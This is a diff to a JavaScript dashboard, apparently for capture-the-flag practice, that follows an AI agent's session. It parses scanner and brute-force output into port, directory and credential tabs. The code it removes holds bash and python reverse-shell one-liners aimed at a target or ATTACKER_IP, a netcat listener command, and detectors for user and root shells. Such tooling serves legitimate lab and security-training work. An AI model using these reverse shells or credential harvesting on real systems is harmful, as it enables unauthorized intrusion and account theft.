+  const knownSource = ["gobuster", "ffuf", "dirb", "nikto"].includes(source);
+  if (!code && !knownSource) return;
+  const prev = state.dirs[path] || {};
+  state.dirs[path] = {
+    path,
+    code: code ? String(code) : (prev.code || ""),
+    size: size ? String(size) : (prev.size || ""),
+    source: source || prev.source || "tool",
+    ts: Date.now(),
+  };
+  persistDirs(); updateDirsBadge();
+  if (state.view === "dirs") renderDirs();
+}
+
+function renderDirs() {
+  const p = $("#pane-dirs");
+  p.innerHTML = "";
+  const entries = Object.values(state.dirs);
+  if (!entries.length) {
+    p.appendChild(el("div", { class: "empty" }, "No directories observed yet. gobuster / ffuf / dirb / nikto output populates this tab automatically."));
+    return;
+  }
+  // sort: 200s first, then by path
+  const rank = c => c === "200" ? 0 : c === "301" || c === "302" ? 1 : c === "401" || c === "403" ? 2 : 3;
+  entries.sort((a, b) => (rank(a.code) - rank(b.code)) || a.path.localeCompare(b.path));
+  p.appendChild(el("div", { class: "row-head dirs-row" },
+    el("span", {}, "Path"),
+    el("span", {}, "Status"),
+    el("span", {}, "Notes"),
+    el("span", {}, "Size")
+  ));
+  for (const e of entries) {
+    let cls = "v";
+    let note = "";
+    if (e.code === "200") { cls = "v good"; note = "OK"; }
+    else if (e.code === "301" || e.code === "302") { cls = "v"; note = "redirect"; }
+    else if (e.code === "401") { cls = "v warn"; note = "auth required"; }
+    else if (e.code === "403") { cls = "v warn"; note = "forbidden · exists"; }
+    else if (e.code && e.code.startsWith("5")) { cls = "v bad"; note = "server error"; }
+    const status = e.code ? "HTTP " + e.code : (e.source === "nikto" ? "nikto" : "—");
+    p.appendChild(el("div", { class: "row dirs-row" },
+      el("span", { class: "k" }, e.path),
+      el("span", { class: cls }, status),
+      el("span", { class: "v" }, note || (e.source === "nikto" ? "nikto finding" : "")),
+      el("span", { class: "size" }, e.size ? e.size + "b" : "")
+    ));
+  }
+}
+
+// ---------- PORT + DIR EXTRACTION (only on tool_result text) ----------
+function scanForPortsAndDirs(line, tool) {
+  if (!line) return;
+  const L = String(line);
+  const src = tool || "tool";
+  let m;
+
+  // ---- NMAP open ports ----
+  // "Discovered open port 80/tcp on 10.x.x.x"
+  if ((m = L.match(/Discovered open port\s+(\d+)\/(tcp|udp)\b/i))) {
+    addPort(m[1], m[2], "", "", "nmap");
+  }
+  // "22/tcp open ssh   OpenSSH 8.2p1 Ubuntu ..."
+  if ((m = L.match(/^\s*(\d{1,5})\/(tcp|udp)\s+open\s+(\S+)(?:\s+(.+?))?\s*$/))) {
+    addPort(m[1], m[2], m[3], (m[4] || "").trim(), "nmap");
+  }
+  // "Service Info: OS: Linux; CPE: ..." — sometimes nmap reports services elsewhere
+  // (handled implicitly by the line above)
+
+  // ---- GOBUSTER ----
+  // "/admin (Status: 200) [Size: 1234]"
+  const goRe = /(\/[A-Za-z0-9._\/\-~%]{1,160})\s+\(Status:\s*(\d{3})\)(?:\s*\[Size:\s*(\d+))?/g;
+  while ((m = goRe.exec(L)) !== null) addDir(m[1], m[2], m[3] || "", "gobuster");
+
+  // ---- FFUF ----
+  // "/admin [Status: 200, Size: 1234, ...]"
+  const ffRe = /\b(\/[A-Za-z0-9._\/\-~%]{1,160})\b[^\n]*?\[Status:\s*(\d{3})[^\]]*?(?:Size:\s*(\d+))?/g;
+  while ((m = ffRe.exec(L)) !== null) addDir(m[1], m[2], m[3] || "", "ffuf");
+
+  // ---- DIRB ----
+  // "http://host/admin (CODE:200|SIZE:1234)"
+  const dbRe = /https?:\/\/[^\/\s]+(\/[A-Za-z0-9._\/\-~%]{1,160})\s*\(CODE:(\d{3})\|SIZE:(\d+)\)/g;
+  while ((m = dbRe.exec(L)) !== null) addDir(m[1], m[2], m[3], "dirb");
+
+  // ---- NIKTO ----
+  if ((m = L.match(/^\+\s+(\/[A-Za-z0-9._\/\-~%]{1,160}):/))) addDir(m[1], "", "", "nikto");
+}
+
+// ---------- CRED EXTRACTION (only on tool_result text) ----------
+function scanForCreds(line, tool) {
+  if (!line) return;
+  const L = String(line);
+  const src = tool || "tool";
+  let m;
+
+  // hydra: "[port][proto] host: 1.2.3.4   login: bob   password: hunter2"
+  if ((m = L.match(/host:\s*(\S+).*?login:\s*(\S+)\s+password:\s*([^\s"]+?)(?=\s|\\n|"|$)/i))) {
+    addCred(m[2], m[3], "hydra · " + m[1], "hydra", L);
+    return;
+  }
+
+  // medusa: "ACCOUNT FOUND: [ssh] Host: 1.2.3.4 User: bob Password: hunter2 [SUCCESS]"
+  if ((m = L.match(/ACCOUNT FOUND:.*?User:\s*(\S+)\s+Password:\s*(\S+)/i))) {
+    addCred(m[1], m[2], "medusa", "medusa", L);
+    return;
+  }
+
+  // ncrack: "Discovered credentials for ssh on 1.2.3.4:22 - bob:hunter2"
+  if ((m = L.match(/Discovered credentials.+?\s+(\S+):(\S+)\s*$/i))) {
+    addCred(m[1], m[2], "ncrack", "ncrack", L);
+    return;
+  }
+
+  // patator: "INFO - ... user:bob password:hunter2"
+  if ((m = L.match(/user[=:\s]+(\S+)\s+password[=:\s]+(\S+)/i))) {
+    addCred(m[1], m[2], "", "patator/tool", L);
+    return;
+  }
+
+  // explicit Username:/Password: pair (cracking output, web responses)
+  if ((m = L.match(/\bUsername:\s*(\S+)\s+Password:\s*(\S+)/i))) {
+    addCred(m[1], m[2], "", "tool", L);
+    return;
+  }
+
+  // SQL dumps & similar: "username='bob' password='hunter2'"
+  if ((m = L.match(/\b(?:username|user|login)\s*[:=]\s*['"]?([A-Za-z0-9._\-@]{2,40})['"]?\s*[,;|]?\s*(?:password|pass|pwd)\s*[:=]\s*['"]?([^\s'",;|]{3,80})['"]?/i))) {
+    addCred(m[1], m[2], "", "tool", L);
+    return;
+  }
+
+  // explicit cleartext leak: "Your new password is: hunter2"
+  if ((m = L.match(/Your\s+(?:new\s+)?password\s+is[:\s]+([^\s'",;|]{3,80})/i))) {
+    const userM = L.match(/\b(?:for|to)\s+(?:user\s+)?(?:["'`]?)([a-z_][a-z0-9_\-]{1,31})(?:["'`]?)\b/i);
+    if (userM) addCred(userM[1], m[1], "leaked", "leak", L);
+    return;
+  }
+
+  // hashcat/john cracked output: "$hash$:plaintext"  or "user:plaintext (cracked)"
+  if ((m = L.match(/^\s*([a-z_][a-z0-9_\-]{1,31}):([^\s:]{3,80})\s+\(cracked\)/im))) {
+    addCred(m[1], m[2], "", "hashcat/john", L);
+    return;
+  }
+
+  // bare "bob:hunter2" only when LINE looks credential-shaped
+  if (/\b(?:cred|credentials|password|hash|cracked|valid|found|success|root|admin|user)\b/i.test(L)) {
+    const simple = L.match(/(?:^|\s|["'`(])([a-z_][a-z0-9_\-]{1,31}):([^\s'"`)/\\:]{4,80})(?=\s|$|["'`),.;])/i);
+    if (simple) {
+      const p = simple[2];
+      const looksJunk = /^\d{1,5}$/.test(p) ||
+                       /^\d+\.\d+/.test(p) ||
+                       /^\d\d:\d\d/.test(p) ||
+                       p.includes("/") || p.includes("\\");
+      if (!looksJunk) addCred(simple[1], p, "", "tool", L);
+    }
+  }
+}
+
+// ---------- EVENT INGESTION ----------
 function renderEvent(ev) {
   if (!ev) return;
   const t = ev.type || "";
   if (t === "assistant_text" || (ev.role === "assistant" && ev.text)) {
     const text = stripMeta(ev.text || "");
-    if (text) pushLine({ src:"CLAUDE", msg: text.length>500 ? text.slice(0,500)+"…" : text });
+    if (text) pushLine("CLAUDE", text.length > 600 ? text.slice(0, 600) + "…" : text);
   } else if (t === "user_text" || (ev.role === "user" && ev.text)) {
     const text = stripMeta(ev.text || "");
-    if (text) pushLine({ src:"YOU", msg: text.length>500 ? text.slice(0,500)+"…" : text });
+    if (text) pushLine("YOU", text.length > 600 ? text.slice(0, 600) + "…" : text);
   } else if (t === "tool_use") {
-    pushLine({ src:"TOOL", msg: `▶ ${ev.tool || ev.name || "tool"} ${ev.input_preview ? "— " + ev.input_preview : ""}`, level:"dim" });
+    const name = ev.tool || ev.name || "tool";
+    const prev = ev.input_preview ? " — " + ev.input_preview : "";
+    pushLine("TOOL", "▶ " + name + prev);
   } else if (t === "tool_result") {
     const text = stripMeta(ev.text || "");
     if (text) {
-      pushLine({ src:"RESULT", msg: text.length>400 ? text.slice(0,400)+"…" : text, level:"dim" });
-      // scan tool_result text for shell pop signals — Bash output land here
-      text.split("\n").forEach(detectShellEvent);
+      pushLine("RESULT", text.length > 500 ? text.slice(0, 500) + "…" : text);
+      text.split("\n").forEach(ln => {
+        scanForCreds(ln, ev.tool || "tool");
+        scanForPortsAndDirs(ln, ev.tool || "tool");
+      });
     }
   }
 }
+
+// ---------- POLLING ----------
+async function fetchJSON(url) {
+  try { const r = await fetch(url); if (!r.ok) return null; return await r.json(); }
+  catch { return null; }
+}
 async function pollSessions() {
-  const res = await fetchJSON("/api/sessions");
-  if (!res || !Array.isArray(res.sessions)) return;
-  const fresh = res.sessions.filter(s => Date.now() - (s.mtime||0)*1000 < 60000)
-                            .sort((a,b)=>(b.mtime||0)-(a.mtime||0));
-  if (fresh.length) {
-    const pick = fresh[0];
-    if (pick.path !== state.sessionPath) {
-      state.sessionPath = pick.path;
-      state.eventOffset = 0;
-      pushLine({ src:"OPS", msg:`Subscribed to session → ${pick.path}`, level:"dim" });
-    }
+  const r = await fetchJSON("/api/sessions");
+  if (!r || !Array.isArray(r.sessions)) return;
+  const fresh = r.sessions
+    .filter(s => Date.now() - (s.mtime || 0) * 1000 < 60000)
+    .sort((a, b) => (b.mtime || 0) - (a.mtime || 0));
+  if (!fresh.length) return;
+  const pick = fresh[0];
+  if (pick.path !== state.sessionPath) {
+    state.sessionPath = pick.path;
+    state.eventOffset = 0;
+    $("#src-label").textContent = "tailing " + pick.path;
   }
 }
 async function pollEvents() {
   if (!state.sessionPath) return;
-  const u = `/api/events?path=${encodeURIComponent(state.sessionPath)}&offset=${state.eventOffset}`;
-  const res = await fetchJSON(u);
-  if (!res) return;
-  if (typeof res.offset === "number") state.eventOffset = res.offset;
-  if (res.events && res.events.length) {
-    for (const ev of res.events) renderEvent(ev);
-    state.lastFresh = Date.now();
-    updateFreshness();
-  }
+  const u = "/api/events?path=" + encodeURIComponent(state.sessionPath) + "&offset=" + state.eventOffset;
+  const r = await fetchJSON(u);
+  if (!r) return;
+  if (typeof r.offset === "number") state.eventOffset = r.offset;
+  if (r.events && r.events.length) for (const ev of r.events) renderEvent(ev);
 }
 
-function updateFreshness() {
-  const f = $("#freshness");
-  if (!state.lastFresh) { f.textContent = "last update —"; return; }
-  const s = Math.floor((Date.now() - state.lastFresh) / 1000);
-  f.textContent = `last update ${s}s ago`;
-}
-setInterval(updateFreshness, 1000);
-
-/* ===================================================================
-   ELAPSED TIMER
-   =================================================================== */
 setInterval(() => {
-  if (!state.startedAt) return;
-  $("#tb-elapsed").textContent = fmtTime(Date.now() - state.startedAt);
+  if (Date.now() - state.lastFresh > 4000) {
+    $("#status").textContent = "standby";
+    $("#status").style.color = "var(--fg-dim)";
+  }
 }, 1000);
 
-/* ===================================================================
-   CREDS
-   =================================================================== */
-async function pollCreds() {
-  const r = await fetchJSON("/api/creds");
-  if (!r || !Array.isArray(r.creds)) return;
-  state.creds = r.creds;
-  $("#cred-badge").textContent = state.creds.length;
-  $("#cred-count2").textContent = state.creds.length;
+$("#clear").addEventListener("click", () => {
+  // telemetry
+  stream.innerHTML = "";
+  state.count = 0;
+  $("#count").textContent = "0 lines";
+  // nmap
+  state.ports = {};
+  localStorage.removeItem("thm-ports");
+  updatePortBadge();
+  if (state.view === "nmap") renderPorts();
+  // directories
+  state.dirs = {};
+  localStorage.removeItem("thm-dirs");
+  updateDirsBadge();
+  if (state.view === "dirs") renderDirs();
+  // credentials
+  state.creds = {};
+  localStorage.removeItem("thm-creds");
+  updateCredBadge();
   if (state.view === "creds") renderCreds();
-}
-function renderCreds() {
-  const list = $("#cred-list");
-  list.innerHTML = "";
-  if (!state.creds.length) {
-    list.appendChild(el("div", { class:"h-label", style:"color:var(--fg-dim);" }, "No credentials captured yet."));
-    return;
-  }
-  state.creds.forEach((c,i) => {
-    const row = el("div", { class:"cred-card" },
-      el("div", { class:"cred-head" },
-        el("span", { class:"cred-svc" }, (c.service||"?").toUpperCase() + (c.host?(" @ "+c.host):"")),
-        el("span", { class:"cred-src" }, "via "+(c.source||"manual"))
-      ),
-      el("div", { class:"cred-row" },
-        el("span", { class:"k" }, "User"),
-        el("span", { class:"v" }, c.username||""),
-        el("div", { class:"cred-actions" },
-          el("button", { onclick: ()=>{ navigator.clipboard.writeText(c.username||""); toast("User copied"); } }, "COPY")
-        )
-      ),
-      el("div", { class:"cred-row" },
-        el("span", { class:"k" }, "Pass"),
-        el("span", { class:"v mono" }, c.password||""),
-        el("div", { class:"cred-actions" },
-          el("button", { onclick: () => { navigator.clipboard.writeText(c.password||""); toast("Password copied"); } }, "COPY"),
-          el("button", { class:"del", onclick: () => deleteCred(i) }, "DEL")
-        )
-      )
-    );
-    if (c.notes) row.appendChild(el("div", { class:"cred-notes" }, c.notes));
-    list.appendChild(row);
-  });
-}
-async function deleteCred(idx) {
-  await fetch("/api/creds?idx="+idx, { method:"DELETE" }).catch(()=>{});
-  pollCreds();
-}
-$("#cred-form").addEventListener("submit", async (ev) => {
-  ev.preventDefault();
-  const fd = new FormData(ev.target);
-  const cred = Object.fromEntries(fd.entries());
-  if (!cred.service && !cred.username && !cred.password) return;
-  cred.source = cred.source || "manual";
-  await fetch("/api/creds", { method:"POST", headers:{"Content-Type":"application/json"},
-    body: JSON.stringify(cred) }).catch(()=>{});
-  ev.target.reset();
-  toast("Credential stored");
-  pollCreds();
 });
 
-/* ===================================================================
-   TABS
-   =================================================================== */
-$$(".tab").forEach(t => t.addEventListener("click", () => {
-  $$(".tab").forEach(x => x.classList.remove("active"));
-  t.classList.add("active");
-  state.view = t.dataset.view;
-  document.body.classList.toggle("view-creds", state.view === "creds");
-  document.body.classList.toggle("view-intel", state.view === "intel");
-  document.body.classList.toggle("view-cves",  state.view === "cves");
-  if (state.view === "creds") renderCreds();
-  if (state.view === "intel") renderIntel();
-  if (state.view === "cves")  renderCves();
-}));
-
-/* ===================================================================
-   LOG SOURCE SELECT
-   =================================================================== */
-$("#log-source").addEventListener("change", (ev) => {
-  state.logPath = ev.target.value || null;
-  state.logOffset = 0;
-  if (state.logPath) pushLine({ src:"OPS", msg:`Source switched → ${state.logPath}`, level:"dim" });
-});
-
-/* ===================================================================
-   TOOLKIT BUTTONS
-   =================================================================== */
-function snippet(kind) {
-  const T = state.target === "—" ? "ATTACKER_IP" : state.target;
-  if (kind === "bash")   return `bash -c 'bash -i >& /dev/tcp/${T}/4444 0>&1'`;
-  if (kind === "python") return `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${T}",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`;
-  if (kind === "stab")   return `python3 -c 'import pty;pty.spawn("/bin/bash")'; export TERM=xterm-256color; stty raw -echo; fg`;
-  return "";
-}
-$$("#dossier .toolkit button").forEach(b => b.addEventListener("click", () => {
-  const tk = b.dataset.tk;
-  if (tk === "listener") {
-    armListener();
-  } else {
-    const s = snippet(tk);
-    navigator.clipboard.writeText(s);
-    toast("Copied " + tk.toUpperCase() + " snippet");
-  }
-}));
-async function armListener() {
-  try {
-    await fetch("/api/spawn-terminal", {
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body: JSON.stringify({ cmd: "nc -lvnp 4444" })
-    });
-    toast("Listener armed on :4444", "good");
-    pushLine({src:"OPS", msg:"Listener armed → nc -lvnp 4444", level:"good"});
-  } catch {
-    toast("Listener failed (server unreachable)", "bad");
-  }
-}
-$("#btn-listener").addEventListener("click", armListener);
-
-/* ===================================================================
-   ESCALATION OVERLAY — shell pop progression
-   =================================================================== */
-const ESC_STAGES = ["recon", "foothold", "user", "enum", "root"];
-state.escStage = -1;
-state.escSeen = { user: false, root: false };
-
-function setEscStage(target, opts={}) {
-  const idx = ESC_STAGES.indexOf(target);
-  if (idx < 0) return;
-  state.escStage = Math.max(state.escStage, idx);
-  // update pip states
-  $$(".esc-pip").forEach((p, i) => {
-    p.classList.remove("active", "done");
-    if (i < state.escStage) p.classList.add("done");
-    else if (i === state.escStage) p.classList.add("active");
-  });
-}
-
-function flashEscalation(stage, opts={}) {
-  // stage = "user" | "root"
-  const overlay = $("#esc-overlay");
-  const isRoot = (stage === "root");
-  overlay.classList.toggle("root-stage", isRoot);
-  $("#esc-stage-label").textContent = isRoot ? "ROOT ACQUIRED" : "SHELL ACQUIRED";
-  $("#esc-stage-name").textContent  = isRoot ? "ROOT" : "USER";
-  $("#esc-banner").textContent      = opts.banner || (isRoot
-    ? "uid=0(root) — full system control"
-    : "foothold established — enumerate, escalate, persist");
-  setEscStage(stage);
-  overlay.classList.add("show");
-
-  // dramatic timing: ~3.4s, with a stage-pip cascade
-  const seq = isRoot
-    ? ["recon","foothold","user","enum","root"]
-    : ["recon","foothold","user"];
-  seq.forEach((s,i) => setTimeout(() => setEscStage(s), 250 + i*350));
-
-  setTimeout(() => overlay.classList.remove("show"), 3600);
-
-  pushLine({
-    src: "OPS",
-    msg: isRoot
-      ? "★★★ ROOT SHELL ACQUIRED ★★★ uid=0 — engagement complete."
-      : "★ USER SHELL ACQUIRED — foothold established on target.",
-    level: "good"
-  });
-  toast(isRoot ? "ROOT SHELL ACQUIRED — bringing Terminal forward" : "USER SHELL ACQUIRED — bringing Terminal forward", "good", 6000);
-
-  // bring the (already-running) listener Terminal to the front so the
-  // operator can immediately type into the popped shell
-  fetch("/api/focus-terminal", { method:"POST" }).catch(()=>{});
-}
-
-function detectShellEvent(line) {
-  if (!line) return;
-  const L = String(line);
-
-  // ROOT signals — strongest first
-  if (!state.escSeen.root) {
-    if (/uid=0\(root\)/.test(L) ||
-        /\broot@[\w.-]+:[~\/][\w\/.-]*#\s*$/.test(L) ||
-        /^#\s*$/.test(L.trim()) ||
-        /\bwhoami\b[\s\S]{0,40}root\b/i.test(L) ||
-        /Got\s+root/i.test(L) ||
-        /\broot shell\b/i.test(L)) {
-      state.escSeen.root = true;
-      // make sure user-stage gets recorded too if we skipped it
-      if (!state.escSeen.user) state.escSeen.user = true;
-      flashEscalation("root", { banner: shortStr(L, 80) });
-      return;
-    }
-  }
-
-  // USER shell signals
-  if (!state.escSeen.user) {
-    if (/Connect to \[?[\d.:]+\]?.* from /i.test(L) ||
-        /connection received/i.test(L) ||
-        /listening on .* connect to /i.test(L) ||
-        /\b[a-z_][\w-]*@[\w.-]+:[~\/][\w\/.-]*\$\s*$/.test(L) ||
-        /\bid=\d+\([^)]+\)/.test(L) ||
-        /\$\s*$/.test(L.trim()) && /\w@\w/.test(L) ||
-        /\buser shell\b/i.test(L) ||
-        /shell is upgraded/i.test(L)) {
-      state.escSeen.user = true;
-      flashEscalation("user", { banner: shortStr(L, 80) });
-      return;
-    }
-  }
-}
-function shortStr(s, n) {
-  s = String(s).replace(/\s+/g, " ").trim();
-  return s.length > n ? s.slice(0, n) + "…" : s;
-}
-
-/* ===================================================================
-   HEARTBEAT — always-on ECG canvas + ambient telemetry ticks
-   =================================================================== */
-const hbCanvas = $("#hb-canvas");
-const hbCtx    = hbCanvas.getContext("2d");
-function resizeHB() {
-  const r = hbCanvas.getBoundingClientRect();
-  hbCanvas.width  = Math.max(1, Math.floor(r.width  * devicePixelRatio));
-  hbCanvas.height = Math.max(1, Math.floor(r.height * devicePixelRatio));
-}
-window.addEventListener("resize", resizeHB);
-resizeHB();
-
-// Real sparkline: events per 1-second bucket over the last 60s.
-// Each bar = count of telemetry arrivals (excl. our own OPS ticks) in that second.
-function hbStep() {
-  const w = hbCanvas.width, h = hbCanvas.height;
-  const now = Date.now();
-  const BUCKETS = 60;       // 60 one-second columns
-  const buckets = new Array(BUCKETS).fill(0);
-  for (const t of state.arrivalsT) {
-    const ageS = Math.floor((now - t) / 1000);
-    if (ageS >= 0 && ageS < BUCKETS) buckets[BUCKETS - 1 - ageS]++;
-  }
-  const peak = Math.max(1, ...buckets);
-
-  const cs = getComputedStyle(document.body);
-  const cBase = (cs.getPropertyValue("--line-2") || "#283341").trim();
-  const cAccent = (cs.getPropertyValue("--accent") || "#5cb8d8").trim();
-  const cGood = (cs.getPropertyValue("--good") || "#4ea877").trim();
-
-  hbCtx.clearRect(0, 0, w, h);
-  // baseline
-  hbCtx.strokeStyle = cBase;
-  hbCtx.lineWidth = 1;
-  hbCtx.beginPath();
-  hbCtx.moveTo(0, h - 0.5); hbCtx.lineTo(w, h - 0.5); hbCtx.stroke();
-
-  // bars
-  const barW = w / BUCKETS;
-  for (let i = 0; i < BUCKETS; i++) {
-    const v = buckets[i];
-    if (!v) continue;
-    const barH = Math.max(1, (v / peak) * (h - 2));
-    // most recent column = good color, older = accent
-    hbCtx.fillStyle = (i === BUCKETS - 1) ? cGood : cAccent;
-    hbCtx.fillRect(i * barW, h - barH - 0.5, Math.max(1, barW - 1 * devicePixelRatio), barH);
-  }
-}
-setInterval(hbStep, 1000);
-
-// Honest idle-status lines — every value here is a real measurement from
-// the running HUD. Emitted only after a long quiet period, so this is a
-// "I'm still here, here's actual state" tick, not fake instrumentation.
-function idleStatus() {
-  const quietS = Math.floor((Date.now() - state.lastFresh) / 1000);
-  const tool = state.activeTool ? state.activeTool.toUpperCase() : "none";
-  const phase = (state.activeTool && state.phases[state.phaseIdx])
-                ? state.phases[state.phaseIdx].name
-                : "idle";
-  const ports = Object.keys(state.services).length;
-  const tgt = state.target !== "—" ? state.target : "no target";
-  return `idle ${quietS}s · target ${tgt} · tool ${tool} · phase ${phase} · ports ${ports} · stream ${state.telLines}`;
-}
-let lastAmbient = 0;
-setInterval(() => {
-  const now = Date.now();
-  // only tick if the stream has been quiet for >15s (was 2s — way too chatty)
-  if (now - state.lastFresh > 15000 && now - lastAmbient > 30000) {
-    pushLine({ src: "OPS", msg: "· " + idleStatus(), level: "dim" });
-    lastAmbient = now;
-  }
-}, 5000);
-
-/* ===================================================================
-   RESIZER — drag the row divider to grow/shrink telemetry vs row2
-   =================================================================== */
-(function setupResizer(){
-  const main    = $("#main");
-  const handle  = $("#row-resizer");
-  if (!handle || !main) return;
-
-  // restore saved size
-  const saved = parseFloat(localStorage.getItem("thm-row1-pct"));
-  if (!Number.isNaN(saved) && saved > 15 && saved < 85) {
-    main.style.setProperty("--row1", saved + "%");
-  }
-
-  let dragging = false;
-  function onDown(e) {
-    dragging = true;
-    handle.classList.add("dragging");
-    document.body.classList.add("row-resizing");
-    e.preventDefault();
-  }
-  function onMove(e) {
-    if (!dragging) return;
-    const r = main.getBoundingClientRect();
-    const y = (e.touches ? e.touches[0].clientY : e.clientY) - r.top;
-    let pct = (y / r.height) * 100;
-    if (pct < 15) pct = 15;
-    if (pct > 85) pct = 85;
-    main.style.setProperty("--row1", pct + "%");
-  }
-  function onUp() {
-    if (!dragging) return;
-    dragging = false;
-    handle.classList.remove("dragging");
-    document.body.classList.remove("row-resizing");
-    const v = main.style.getPropertyValue("--row1");
-    if (v) localStorage.setItem("thm-row1-pct", parseFloat(v));
-  }
-  handle.addEventListener("mousedown", onDown);
-  handle.addEventListener("touchstart", onDown, { passive: false });
-  window.addEventListener("mousemove", onMove);
-  window.addEventListener("touchmove", onMove, { passive: false });
-  window.addEventListener("mouseup", onUp);
-  window.addEventListener("touchend", onUp);
-  // double-click resets to default
-  handle.addEventListener("dblclick", () => {
-    main.style.removeProperty("--row1");
-    localStorage.removeItem("thm-row1-pct");
-  });
-})();
-
-/* ===================================================================
-   TARGET INTEL — categorized facts about the target system
-   =================================================================== */
-const INTEL_GROUPS = [
-  { id: "system",  label: "System",          icon: "⊞" },
-  { id: "users",   label: "Users",           icon: "◉" },
-  { id: "shares",  label: "Shares & Mounts", icon: "▤" },
-  { id: "web",     label: "Web",             icon: "⌘" },
-  { id: "vulns",   label: "Vulnerabilities", icon: "⚠" },
-  { id: "notes",   label: "Notes (pinned)",  icon: "★" },
-];
-state.intel       = {};       // keyed by `${category}::${key}` → {category,key,value,source,ts}
-state.intelFresh  = new Set(); // keys added in the last few seconds (for flash anim)
-
-function loadIntel() {
-  try {
-    const raw = localStorage.getItem("thm-intel");
-    if (raw) state.intel = JSON.parse(raw) || {};
-  } catch { state.intel = {}; }
-}
-function saveIntel() {
-  try { localStorage.setItem("thm-intel", JSON.stringify(state.intel)); } catch {}
-}
-function intelKey(category, key) {
-  return category + "::" + String(key||"").toLowerCase();
-}
-function addIntel(category, key, value, source, opts={}) {
-  if (!key || !value) return false;
-  category = String(category||"notes").toLowerCase();
-  key = String(key).trim();
-  value = String(value).trim().slice(0, 600);
-  source = String(source||"auto").trim();
-  const k = intelKey(category, key);
-  const existing = state.intel[k];
-  // Skip if we already have it with the same value
-  if (existing && existing.value === value) return false;
-  state.intel[k] = { category, key, value, source, ts: Date.now() };
-  state.intelFresh.add(k);
-  setTimeout(() => { state.intelFresh.delete(k); if (state.view === "intel") renderIntel(); }, 1800);
-  saveIntel();
-  updateIntelBadge();
-  if (state.view === "intel") renderIntel();
-  if (!opts.silent && !existing) {
-    pushLine({ src:"OPS", msg: `▤ intel · ${category} · ${key} = ${value.length>60?value.slice(0,60)+"…":value}`, level:"dim" });
-  }
-  return true;
-}
-function removeIntel(k) {
-  delete state.intel[k];
-  saveIntel();
-  updateIntelBadge();
-  renderIntel();
-}
-function clearIntel() {
-  state.intel = {};
-  saveIntel();
-  updateIntelBadge();
-  renderIntel();
-}
-function updateIntelBadge() {
-  const n = Object.keys(state.intel).length;
-  $("#intel-badge").textContent = n;
-  $("#intel-count").textContent = n + " fact" + (n===1?"":"s");
-}
-
-function renderIntel() {
-  const body = $("#intel-body");
-  body.innerHTML = "";
-  const all = Object.entries(state.intel);
-  if (!all.length) {
-    body.appendChild(el("div", { class:"h-label", style:"color:var(--fg-dim);" },
-      "No intel collected yet. Run tools — anything we learn about the target gets sorted into categories here."));
-    return;
-  }
-  // group by category
-  const grouped = {};
-  for (const g of INTEL_GROUPS) grouped[g.id] = [];
-  for (const [k, fact] of all) {
-    (grouped[fact.category] || (grouped[fact.category] = [])).push([k, fact]);
-  }
-  for (const g of INTEL_GROUPS) {
-    const list = grouped[g.id] || [];
-    if (!list.length) continue;
-    list.sort((a,b) => (b[1].ts||0) - (a[1].ts||0));
-    const group = el("div", { class:"intel-group" });
-    group.appendChild(el("div", { class:"intel-group-head" },
-      el("span", { class:"icon" }, g.icon),
-      el("span", { class:"lab" }, g.label),
-      el("span", { class:"ct" }, list.length + " " + (list.length===1?"entry":"entries"))
-    ));
-    for (const [k, fact] of list) {
-      const row = el("div", { class: "intel-row" + (state.intelFresh.has(k) ? " fresh" : "") },
-        el("span", { class:"k" }, fact.key),
-        el("span", { class:"v" }, fact.value),
-        el("div", { class:"meta" },
-          el("span", {}, "via " + (fact.source||"auto")),
-          el("div", {},
-            el("button", { onclick: () => { navigator.clipboard.writeText(fact.value); toast("Copied"); } }, "CP"),
-            el("button", { onclick: () => removeIntel(k) }, "✕")
-          )
-        )
-      );
-      group.appendChild(row);
-    }
-    body.appendChild(group);
-  }
-}
-
-/* ----- Auto-extraction from telemetry text ----- */
-function extractIntelFromLine(line, sourceHint) {
-  if (!line || !line.trim()) return;
-  const L = String(line);
-  const src = sourceHint || "auto";
-
-  // OS / kernel
-  let m;
-  if ((m = L.match(/\bLinux\s+\S+\s+(\d+\.\d+\.\d+(?:-\S+)?)/i)))            addIntel("system", "kernel", m[1], src, {silent:true});
-  if ((m = L.match(/\bUbuntu\s+(\d+\.\d+(?:\.\d+)?(?:\s+LTS)?)/i)))           addIntel("system", "distro", "Ubuntu " + m[1], src, {silent:true});
-  if ((m = L.match(/\bDebian\s+GNU\/Linux\s+(\d+(?:\.\d+)?)/i)))              addIntel("system", "distro", "Debian " + m[1], src, {silent:true});
-  if ((m = L.match(/\bCentOS\s+(?:Linux\s+)?(\d+(?:\.\d+)?)/i)))              addIntel("system", "distro", "CentOS " + m[1], src, {silent:true});
-  if ((m = L.match(/\bWindows\s+(Server\s+\d{4}|10|11|XP|7|8(?:\.1)?)\b/i))) addIntel("system", "os", "Windows " + m[1], src, {silent:true});
-  if ((m = L.match(/OS:\s+([^|;\n]{3,80})/i)))                                addIntel("system", "os-detected", m[1].trim(), src, {silent:true});
-  if ((m = L.match(/uname[^\n]*\s+(\S+)\s+(\d+\.\d+\.\d+\S*)/i)))             addIntel("system", "uname", m[0].trim().slice(0,160), src, {silent:true});
-
-  // Hostnames + domains (avoid common false positives)
-  const hostMatches = L.match(/\b([a-z0-9][a-z0-9\-]{0,30}\.(?:local|htb|thm|home|lan|internal|corp))\b/gi);
-  if (hostMatches) for (const h of hostMatches) addIntel("system", "hostname", h.toLowerCase(), src, {silent:true});
-  if ((m = L.match(/\bDomain:\s+([A-Z0-9.\-]+)/)))                            addIntel("system", "domain", m[1], src, {silent:true});
-  if ((m = L.match(/\bworkgroup:\s+(\S+)/i)))                                  addIntel("system", "workgroup", m[1], src, {silent:true});
-
-  // Users — passwd-style lines, hydra hits, smb users
-  const passwdRe = /^([a-z_][a-z0-9_-]{0,31}):[x*!]:\d+:\d+/img;
-  let pm; while ((pm = passwdRe.exec(L)) !== null) addIntel("users", pm[1], "uid line present", src, {silent:true});
-  if ((m = L.match(/\bhost:\s*\S+\s+login:\s*(\S+)\s+password:\s*(\S+)/i)))   addIntel("users", m[1], "password: " + m[2], "hydra", {silent:true});
-  if ((m = L.match(/\bUser:\s+([A-Za-z0-9._-]+)\s+RID:/i)))                   addIntel("users", m[1], "SMB-enum user", src, {silent:true});
-
-  // SMB / NFS shares
-  if ((m = L.match(/\bDisk\s+\|\s+(\S+)\b/)))                                  addIntel("shares", m[1], "SMB share", src, {silent:true});
